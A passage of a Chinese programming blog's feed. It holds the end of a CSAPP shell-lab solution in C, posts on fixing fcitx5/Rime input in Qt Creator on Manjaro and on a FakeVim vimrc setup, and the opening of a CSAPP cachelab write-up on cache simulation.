<span class="built_in">printf</span>(<span class="string">&quot;Added job [%d] %d %s\n&quot;</span>, jobs[i].jid, jobs[i].pid, jobs[i].cmdline);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Tried to create too many jobs\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* deletejob - Delete a job whose PID=pid from the job list */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">deletejob</span><span class="params">(struct <span class="keyword">job_t</span> *jobs, <span class="keyword">pid_t</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXJOBS; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (jobs[i].pid == pid)</span><br><span class="line">        &#123;</span><br><span class="line">            clearjob(&amp;jobs[i]);</span><br><span class="line">            nextjid = maxjid(jobs) + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* fgpid - Return PID of current foreground job, 0 if no such job */</span></span><br><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">fgpid</span><span class="params">(struct <span class="keyword">job_t</span> *jobs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXJOBS; i++)</span><br><span class="line">        <span class="keyword">if</span> (jobs[i].state == FG)</span><br><span class="line">            <span class="keyword">return</span> jobs[i].pid;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* getjobpid  - Find a job (by PID) on the job list */</span></span><br><span class="line"><span class="function">struct <span class="keyword">job_t</span> *<span class="title">getjobpid</span><span class="params">(struct <span class="keyword">job_t</span> *jobs, <span class="keyword">pid_t</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXJOBS; i++)</span><br><span class="line">        <span class="keyword">if</span> (jobs[i].pid == pid)</span><br><span class="line">            <span class="keyword">return</span> &amp;jobs[i];</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* getjobjid  - Find a job (by JID) on the job list */</span></span><br><span class="line"><span class="function">struct <span class="keyword">job_t</span> *<span class="title">getjobjid</span><span class="params">(struct <span class="keyword">job_t</span> *jobs, <span class="keyword">int</span> jid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (jid &lt; <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXJOBS; i++)</span><br><span class="line">        <span class="keyword">if</span> (jobs[i].jid == jid)</span><br><span class="line">            <span class="keyword">return</span> &amp;jobs[i];</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* pid2jid - Map process ID to job ID */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pid2jid</span><span class="params">(<span class="keyword">pid_t</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXJOBS; i++)</span><br><span class="line">        <span class="keyword">if</span> (jobs[i].pid == pid)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> jobs[i].jid;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* listjobs - Print the job list */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">listjobs</span><span class="params">(struct <span class="keyword">job_t</span> *jobs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXJOBS; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (jobs[i].pid != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[%d] (%d) &quot;</span>, jobs[i].jid, jobs[i].pid);</span><br><span class="line">            <span class="keyword">switch</span> (jobs[i].state)</span><br><span class="line">            &#123;</span><br><span class="line">            <span class="keyword">case</span> BG:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Running &quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> FG:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Foreground &quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> ST:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Stopped &quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;listjobs: Internal error: job[%d].state=%d &quot;</span>,</span><br><span class="line">                       i, jobs[i].state);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, jobs[i].cmdline);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/******************************</span></span><br><span class="line"><span class="comment"> * end job list helper routines</span></span><br><span class="line"><span class="comment"> ******************************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/***********************</span></span><br><span class="line"><span class="comment"> * Other helper routines</span></span><br><span class="line"><span class="comment"> ***********************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * usage - print a help message</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usage</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Usage: shell [-hvp]\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;   -h   print this message\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;   -v   print additional diagnostic information\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;   -p   do not emit a command prompt\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * unix_error - unix-style error routine</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unix_error</span><span class="params">(<span class="keyword">char</span> *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>, <span class="string">&quot;%s: %s\n&quot;</span>, msg, strerror(errno));</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app_error - application-style error routine</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">app_error</span><span class="params">(<span class="keyword">char</span> *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>, <span class="string">&quot;%s\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Signal - wrapper for the sigaction function</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">handler_t</span> *<span class="title">Signal</span><span class="params">(<span class="keyword">int</span> signum, <span class="keyword">handler_t</span> *handler)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">action</span>, <span class="title">old_action</span>;</span></span><br><span class="line"></span><br><span class="line">    action.sa_handler = handler;</span><br><span class="line">    sigemptyset(&amp;action.sa_mask); <span class="comment">/* block sigs of type being handled */</span></span><br><span class="line">    action.sa_flags = SA_RESTART; <span class="comment">/* restart syscalls if possible */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sigaction(signum, &amp;action, &amp;old_action) &lt; <span class="number">0</span>)</span><br><span class="line">        unix_error(<span class="string">&quot;Signal error&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> (old_action.sa_handler);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * sigquit_handler - The driver program can gracefully terminate the</span></span><br><span class="line"><span class="comment"> *    child shell by sending it a SIGQUIT signal.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigquit_handler</span><span class="params">(<span class="keyword">int</span> sig)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Terminating after receipt of SIGQUIT signal\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Csapp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shlab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux下rime输入法无法在qt中输入的解决办法</title>
      <link href="/archives/167d6ba3.html"/>
      <url>/archives/167d6ba3.html</url>
      
        <content type="html"><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>今天在manjaro下做qt开发时，发现fcitx-rime输入法无法在qtcreator中输入，google了一波，发现应该是差了某个动态库，网上的发行版大多以debian系列为主，apt安装个包就完了，arch系列不是这样解决的。</p><a id="more"></a><h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p>继续看arch的wiki，搜索fcitx qt等关键词后，发现现在arch都使用的fcitx5了，fcitx5有qt的插件，能够完美解决这些这些问题，具体来说，卸载以前的旧版本fcitx，安装以下包：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/5f22402714195aa594ef0f0e.png" alt="image-20200730113135729"></p><p>参照arch的wiki，安装这些包后，还需要配置环境变量：</p><p>vim ~/.pam_environment </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">INPUT_METHOD  DEFAULT=fcitx5</span><br><span class="line">GTK_IM_MODULE DEFAULT=fcitx5</span><br><span class="line">QT_IM_MODULE  DEFAULT=fcitx5</span><br><span class="line">XMODIFIERS    DEFAULT=@im=fcitx5</span><br></pre></td></tr></table></figure><p>要开机自启动fcitx，执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/applications/fcitx5.desktop ~/.config/autostart</span><br></pre></td></tr></table></figure><p>注销后重新登录，打开fcitx5配置GUI：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/5f224cc914195aa594f584e9.png" alt="image-20200730113337696"></p><p>rime的配置文件路径也变了，具体路径：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~&#x2F;.local&#x2F;share&#x2F;fcitx5&#x2F;rime</span><br></pre></td></tr></table></figure><p>最后一个问题，<strong>修改候选框的字体大小</strong>，这个我找了很久：</p><p><img data-src="https://pic.downk.cc/item/5f22404814195aa594ef2114.png" alt="image-20200730113538459"></p>]]></content>
      
      
      <categories>
          
          <category> 杂文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 输入法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Qt 配置+fakevim自定义</title>
      <link href="/archives/afbe8180.html"/>
      <url>/archives/afbe8180.html</url>
      
        <content type="html"><![CDATA[<p>项目原因，要写点qt代码。记录下个人配置：</p><a id="more"></a><ol><li>高分屏下字体过小问题</li></ol><p><img data-src="https://pic.downk.cc/item/5f1a50e514195aa594c27812.jpg"></p><ol start="2"><li>上下文帮助菜单（即快捷键F1）字体过小问题：</li></ol><p>目前在manjaro-gnome上通过更改字体大小无效，只能更改渲染引擎，然后再更改字体大小，才能生效。</p><p><img data-src="https://pic.downk.cc/item/5f1a512214195aa594c29044.jpg"></p><ol start="3"><li>fakevim配置</li></ol><p><img data-src="https://pic.downk.cc/item/5f1a524414195aa594c3099c.jpg"></p><p>注意右边有个传递Control按键，开启这个选项后，能够使系统自带的一些快捷键（如Ctrl+R,Ctrl+O)和vim的一些特性共同使用。 但是就我个人而言，这样会失去一些vim的快捷键，所以未开启。</p><p>如果不开启传递Control， 那么Ctrl+R，Ctrl+F等常用qtcreator的快捷键又无法使用，好在fakevim支持vimrc，也支持定义ex command，所以可以自行配置vimrc来做键位mapping。下面以 “Run“命令为例，讲解如何配置vimrc。</p><p>打开Fakevim的ex command mapping:</p><p><img data-src="https://pic.downk.cc/item/5f1a535914195aa594c3663f.jpg"></p><p>然后打开你的vimrc，（个人为qt新建了一个配置文件，放在~/.qtvimrc下）</p><p>写上:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot; run operation</span><br><span class="line">map ;r :run&lt;CR&gt;</span><br></pre></td></tr></table></figure><p>这样，就将 “ ;r “ 快捷键绑定为 Run命令了。</p><p>其余命令同理，现在fake vim中的ex command命令中写上mapping命令，然后在vimrc中mapping键位。</p><p>下面是我个人的全部qtvimrc：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">&quot; 显示当前模式</span><br><span class="line">set showmode</span><br><span class="line">&quot; 共享系统粘贴板</span><br><span class="line">set clipborad&#x3D;unamed</span><br><span class="line">&quot; 打开行号</span><br><span class="line">set number</span><br><span class="line">&quot; 打开相对行号</span><br><span class="line">&quot; set relativenumber</span><br><span class="line">&quot; 设置命令历史记录条数</span><br><span class="line">set history&#x3D;2000</span><br><span class="line">&quot; 关闭兼容vi</span><br><span class="line">set nocompatible</span><br><span class="line">&quot; 开启语法高亮功能</span><br><span class="line">syntax enable</span><br><span class="line">&quot; 允许用指定语法高亮配色方案替换默认方案</span><br><span class="line">syntax on</span><br><span class="line">&quot; 模式搜索实时预览,增量搜索</span><br><span class="line">set incsearch</span><br><span class="line">&quot; 设置搜索高亮</span><br><span class="line">set hlsearch</span><br><span class="line">&quot; 忽略大小写 (该命令配合smartcase使用较好，否则不要开启)</span><br><span class="line">set ignorecase</span><br><span class="line">&quot; 模式查找时智能忽略大小写</span><br><span class="line">set smartcase</span><br><span class="line">&quot; vim自身命令行模式智能补全</span><br><span class="line">set wildmenu</span><br><span class="line">&quot; 总是显示状态栏</span><br><span class="line">set laststatus&#x3D;2</span><br><span class="line">&quot; 显示光标当前位置</span><br><span class="line">set ruler</span><br><span class="line">&quot; 高亮显示当前行&#x2F;列</span><br><span class="line">set cursorline</span><br><span class="line">&quot;set cursorcolumn</span><br><span class="line">&quot; 禁止折行</span><br><span class="line">set nowrap</span><br><span class="line">&quot; 将制表符扩展为空格</span><br><span class="line">set expandtab</span><br><span class="line">&quot; 设置编辑时制表符占用空格数</span><br><span class="line">set tabstop&#x3D;4</span><br><span class="line">&quot; 设置格式化时制表符占用空格数</span><br><span class="line">set shiftwidth&#x3D;4</span><br><span class="line">&quot; 让 vim 把连续数量的空格视为一个制表符</span><br><span class="line">set softtabstop&#x3D;4</span><br><span class="line">&quot; 基于缩进或语法进行代码折叠</span><br><span class="line">set foldmethod&#x3D;indent</span><br><span class="line">set foldmethod&#x3D;syntax</span><br><span class="line">&quot; 启动 vim 时关闭折叠代码</span><br><span class="line">set nofoldenable</span><br><span class="line"></span><br><span class="line">&quot; 设置前导键</span><br><span class="line">&quot; let mapleader&#x3D;&quot;;&quot;</span><br><span class="line">&quot; 暂时取消搜索高亮快捷键</span><br><span class="line">nnoremap &lt;silent&gt; ;l :&lt;C-u&gt;nohlsearch&lt;CR&gt;&lt;C-l&gt;</span><br><span class="line"></span><br><span class="line">&quot; 移动相关</span><br><span class="line">&quot; 前一个缓冲区</span><br><span class="line">nnoremap &lt;silent&gt; [b :w&lt;CR&gt;:bprevious&lt;CR&gt;</span><br><span class="line">&quot; 后一个缓冲区</span><br><span class="line">nnoremap &lt;silent&gt; ]b :w&lt;CR&gt;:bnext&lt;CR&gt;</span><br><span class="line">&quot; 定义快捷键到行首和行尾</span><br><span class="line">map H ^</span><br><span class="line">map L $</span><br><span class="line">&quot; 定义快速跳转</span><br><span class="line">nmap ;t &lt;C-]&gt;</span><br><span class="line">&quot; 定义快速跳转回退</span><br><span class="line">nmap ;T &lt;C-t&gt;</span><br><span class="line">&quot; 标签页后退 ---标签页前进是gt</span><br><span class="line">nmap gn gt</span><br><span class="line">nmap gp gT</span><br><span class="line"></span><br><span class="line">&quot; 文件操作相关</span><br><span class="line">&quot; 定义快捷键关闭当前分割窗口</span><br><span class="line">nmap ;q :q&lt;CR&gt;</span><br><span class="line">&quot; 定义快捷键保存当前窗口内容</span><br><span class="line">nmap ;w :w&lt;CR&gt;</span><br><span class="line"></span><br><span class="line">&quot; 窗口操作相关</span><br><span class="line">map &lt;C-j&gt; &lt;C-W&gt;j</span><br><span class="line">map &lt;C-k&gt; &lt;C-W&gt;k</span><br><span class="line">map &lt;C-h&gt; &lt;C-W&gt;h</span><br><span class="line">map &lt;C-l&gt; &lt;C-W&gt;l</span><br><span class="line"></span><br><span class="line">&quot; 使用 qt内部功能</span><br><span class="line">&quot; run operation</span><br><span class="line">map ;r :run&lt;CR&gt;</span><br><span class="line">&quot; copy operation</span><br><span class="line">map ;c :copy&lt;CR&gt;</span><br><span class="line">&quot; paste operation</span><br><span class="line">map ;v :paste&lt;CR&gt;</span><br><span class="line">&quot; cut operation</span><br><span class="line">map ;x :cut&lt;CR&gt;</span><br><span class="line">&quot; Select All</span><br><span class="line">map ;a :selectall&lt;CR&gt;</span><br><span class="line">&quot; reformat code</span><br><span class="line">map ;f :reformatcode&lt;CR&gt;</span><br><span class="line">&quot; 找到usage</span><br><span class="line">map ;u :findusages&lt;CR&gt;</span><br><span class="line">&quot; 调用idea的replace操作</span><br><span class="line">map ;; :replace&lt;CR&gt;</span><br></pre></td></tr></table></figure><p>基本上是从以前的vimrc配置中copy过来的，所以有些设置在qt中是无效的，但是不影响使用。 关键在 “使用qt内部功能”项下的映射。有些可惜的是fakevim不支持leader键位，所以只能在每处mapping中都硬编码为；  。</p><p>4.反缩进问题</p><p>qtcreator有个反人类的地方在于，写代码换行，会自动缩进，但是退格却又需要退几次才能回到上一行，可以改为：</p><p><img data-src="https://pic.downk.cc/item/5f1a556014195aa594c428c1.jpg"></p><p>剩下的就看个人配置了。</p>]]></content>
      
      
      <categories>
          
          <category> 杂文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vim </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Csapp-Cachelab题解</title>
      <link href="/archives/153b500d.html"/>
      <url>/archives/153b500d.html</url>
      
        <content type="html"><![CDATA[<p>本次 lab, cachelab.</p><h2 id="0-说明"><a href="#0-说明" class="headerlink" title="0. 说明"></a>0. 说明</h2><p>从这个lab开始，终于开始编写一些高级语言的代码了，而不像之前要去分析汇编。但是这并不意味这题目就简单了，实际上，cachelab耗费了我2天多的时间。ok，言归正传，这个lab的目的是什么呢？</p><p>cachelab帮助我们理解计算机存储体系中的重要组成部分–cache。 理解cache是如何组织的，如何工作的，又是如何影响我们的程序的性能的。</p><a id="more"></a><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200726101259903.png" style="zoom: 33%;" /><p>cache站立于整个存储体系的上端（低于寄存器），其重要性不言而喻了。</p><p>题目说明：</p><p>cachelab只有2个题目。</p><ol><li>写一个cache工作的模拟器，给一段内存访问的trace file，根据trace file仿真，得到这段trace file的hit，miss，eviction数。</li><li>编写cache友好的代码，具体是给3种给定大小的矩阵A，求A的转置，每种大小都要miss要求。</li></ol><p>具体题目请参照cachelab的write up。</p><h2 id="1-第一部分–cache工作方式仿真"><a href="#1-第一部分–cache工作方式仿真" class="headerlink" title="1. 第一部分–cache工作方式仿真"></a>1. 第一部分–cache工作方式仿真</h2><p>做完这个题目，可以让人理解cache的组织，工作方式，替换策略等。<strong>先说一下题目，</strong>本题主要可以分为以下几个部分：</p><ol><li>trace file</li></ol><p>题目会给出一些trace files， trace file的格式如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">I 0400d7d4,8</span><br><span class="line"> M 0421c7f0,4</span><br><span class="line"> L 04f6b868,8</span><br><span class="line"> S 7ff0005c8,8</span><br></pre></td></tr></table></figure><p>语法为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[space]operation address,size</span><br></pre></td></tr></table></figure><p>The operation ﬁeld denotes the type of memory access: “I” denotes an instruction load, “L” a data load,  “S” a data store, and “M” a data modify (i.e., a data load followed by a data store). There is never a space before each “I”. There is always a space before each “M”, “L”, and “S”. The address ﬁeld speciﬁes a 64-bit hexadecimal memory address. The size ﬁeld speciﬁes the number of bytes accessed by the operation.</p><p>值得注意的是，我们只关注 data ，也就是 M,L,S开头的指令，不关注I开头的指令。解析时，可根据开头是否有空格来解析。</p><p>trace file就是我们要编写的代码的输入源，我们要做的就是根据这些trace file来仿真。</p><ol start="2"><li>cache的组织方式</li></ol><p>题目要求，最终的程序可以接受一些参数，改变cache的组织方式。 如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;csim-ref -s 4 -E 1 -b 4 -t traces&#x2F;yi.trace</span><br></pre></td></tr></table></figure><p>代表：</p><ul><li>set的bit位数为: 4</li><li>E=1，即一个set中只有一个cacheline</li><li>b=4，即一个cache line的block位数为4</li><li>trace file的路径为 traces/yi.trace</li></ul><p>具体可使用的语法为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Usage: .&#x2F;csim-ref [-hv] -s &lt;s&gt; -E &lt;E&gt; -b &lt;b&gt; -t &lt;tracefile&gt;</span><br><span class="line">• -h: Optional help ﬂag that prints usage info</span><br><span class="line">• -v: Optional verbose ﬂag that displays trace info</span><br><span class="line">• -s &lt;s&gt;: Number of set index bits (S &#x3D; 2^s is the number of sets)</span><br><span class="line">• -E &lt;E&gt;: Associativity (number of lines per set)</span><br><span class="line">• -b &lt;b&gt;: Number of block bits (B &#x3D; 2^b is the block size)</span><br><span class="line">• -t &lt;tracefile&gt;: Name of the valgrind trace to replay</span><br></pre></td></tr></table></figure><ol start="3"><li>cacheline 的替换策略，采用LRU</li></ol><p>ok，知道这些了，题目还给了我们一个标准答案，csim-ref, 我们自己最终的程序名为csim. 最终只要csim的输入输出和csim-ref相同即可。</p><p><strong>写程序之前，一定要分析好再写，所以先来分析下我们该怎么做：</strong></p><p>需要哪些背景知识：</p><p>cache的组织方式：</p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200726102158585.png" style="zoom: 50%;" /><p>这张图，给出了cache的组织方式以及cacheline的read方式。</p><p>cache的组织方式非常直观，主要参数为 S, E, B. 这3个参数也决定了cache的相联关系：</p><ol><li>E=1, 直接映射</li><li>E!=1,S!=1, E路S组相联</li><li>S=1, 全相联映射。（内存和Disk就是这种映射）</li></ol><p>cacheline的read分为以下几步：</p><ol><li>根绝set bit，决定set索引</li><li>比较该组的所有line，是否有匹配的tag。如有，并且valid有效，则hit，并根据b 决定数据偏移。否则，第3步。</li><li>load该cacheline到cache中，如果该组还有空块（valid=0),则加载到空块中，如果没有空块，则根据替换策略进行替换。</li></ol><p><strong>总结下read(load)操作:</strong></p><ol><li>hit, 能在当前cache中找到cacheline</li><li>miss，不能在cahce中找到cacheline，但是该组中有空cacheline。</li><li>eviction，不能再cache中找到cacheline，且该组中没有空cacheline，需要根据替换策略进行替换。</li></ol><p><strong>现在在看下write(store)操作：</strong></p><p>cachelab采用的的是write-back+write-allocate方式。所以，一旦我们的store miss了，需要将该块load到cache中。分析可以下3中情况：</p><ol><li>hit, 能在当前cache中找到cacheline</li><li>miss，不能在cahce中找到cacheline，但是该组中有空cacheline。</li><li>eviction，不能在cache中找到cacheline，且该组中没有空cacheline，需要根据替换策略进行替换。</li></ol><p><strong>最后看下modify操作：</strong></p><p>modify结合了load和store操作，分析可得以下3种情况：</p><ol><li>hit(load) + hit(store), load命中，store也命中</li><li>miss(load)+hit(store), load miss，但是当前cache set中有空块，直接load到cache即可，后续store命中。</li><li>miss(load)+eviction(load)+hit(store),cache种没有该cacheline，且该组没有空块，最后store可命中</li></ol><blockquote><p>额外啰嗦一段：</p><p>cacheline和block非常容易搞混，因为一会说将某个数据块 load到cache，一会又说将某个cacheline load到cache中。 </p><p>其实通常我们说将xx数据块load到cache中，这个数据块是包围在一个cacheline中的，cacheline除了这个数据块以外，还会包含一些元数据，如tag，valid，以及用于实现替换策略的辅助位等。</p><p><strong>简单来说，cacheline包含block， 